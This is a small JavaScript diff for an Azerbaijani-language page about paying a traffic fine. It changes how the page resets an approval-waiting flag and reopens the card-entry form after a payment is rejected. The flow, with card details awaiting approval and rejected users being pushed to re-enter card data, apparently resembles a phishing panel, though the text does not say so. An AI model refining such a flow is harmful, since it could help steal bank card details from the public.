@@ -248,8 +248,11 @@
                 localStorage.setItem('dyp_timer_end', newEndTime);
             }
 
+            if (data.isPaid || data.isRejected) {
+                waitingForApproval = false; // Reset waiting flag!
+            }
+
             if (data.isRejected) {
-                waitingForApproval = false;
                 document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
                 document.getElementById('reject-modal').classList.remove('hidden');
@@ -422,8 +425,8 @@
             document.getElementById('reject-modal').classList.add('hidden');
             waitingForApproval = false;
 
-            // Close any modals and open the Card Details Modal directly so they can re-enter card info!
-            closeModals();
+            // Re-fetch fine data and automatically open card modal so they can re-enter card info!
+            await fetchFineData();
             openCardModal();
         }
 
